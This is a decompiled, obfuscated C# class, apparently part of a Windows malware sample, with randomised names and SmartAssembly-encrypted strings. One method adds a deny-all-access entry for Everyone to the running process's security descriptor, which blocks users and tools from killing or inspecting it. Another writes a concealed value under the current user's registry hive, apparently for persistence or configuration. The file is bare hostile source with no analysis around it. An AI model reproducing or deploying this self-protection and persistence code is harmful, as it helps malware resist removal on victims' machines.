using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

internal sealed class FbEEJaBlaKz
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr GNDsTkxrMLBPh, int gUMhWunBVHn, [Out] byte[] SQeFEOdWejVlwDw, uint LEvPAVKvETk, out uint XzZGMyOrZKG);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr AEEGIjyeeEO, int GTdrloFsWzz, [In] byte[] XMdJZHwbLJrK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void tQRJeNbIFp(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107408479)));
			registryKey.SetValue(opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107408342)), getString_0(107408535));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor ufUWRRJJgxGZG(IntPtr intptr_0)
	{
		byte[] sQeFEOdWejVlwDw = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, sQeFEOdWejVlwDw, 0u, out var XzZGMyOrZKG);
		if ((long)XzZGMyOrZKG > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, sQeFEOdWejVlwDw = new byte[XzZGMyOrZKG], XzZGMyOrZKG, out XzZGMyOrZKG))
		{
			return null;
		}
		return new RawSecurityDescriptor(sQeFEOdWejVlwDw, 0);
	}

	private void OZCZuqmaHGVfWJ(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void snNZJYfBGlDk()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ufUWRRJJgxGZG(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			OZCZuqmaHGVfWJ(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static FbEEJaBlaKz()
	{
		Strings.CreateGetStringDelegate(typeof(FbEEJaBlaKz));
	}
}
